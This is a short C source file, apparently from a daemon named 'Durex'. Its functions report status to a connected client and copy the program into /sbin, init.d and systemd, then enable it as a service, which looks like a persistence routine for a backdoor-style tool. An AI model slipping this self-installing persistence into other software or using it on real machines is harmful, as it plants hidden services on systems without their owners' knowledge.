#include "durex.h"

int		_init_daemon(int f)
{
	if (f & 4)
		system("cp -p Durex /sbin/Durex && chmod +x /sbin/Durex");
	if (f & 2)
		system("cp -p Durex.init /etc/init.d/Durex");
	if (f & 1)
		system("cp -p Durex.service /etc/systemd/system/Durex.service");
	system("systemctl -q daemon-reload");
	system("systemctl -q enable Durex");
	return (0);
}

int    _schk_daemon(struct s_client *client)
{
	struct stat s;
	int flag = 0;

	if (stat("/etc/init.d/Durex", &s) == 0)
		send(client->fd, "Init.d file OK\n", 15, 0);
	else {
		send(client->fd, "Init.d file KO\n", 15, 0);
		flag = flag  | (1 << 0);
	}

	if (stat("/etc/systemd/system/Durex.service", &s) == 0)
		send(client->fd, "systemd file OK\n", 16, 0);
	else {
		flag = flag | (1 << 1);
		send(client->fd, "systemd file KO\n", 16, 0);
	}

	if (stat("/sbin/Durex", &s) == 0)
		send(client->fd, "bin file OK\n", 12, 0);
	else {
		send(client->fd, "bin file KO\n", 12, 0);
		flag = flag | (1 << 2);
	}

	if (flag != 0) {
		send(client->fd, "Daemon is not set, Setting up Daemon\n", 37, 0);
		return (_init_daemon(flag));
	}
	return (0);
}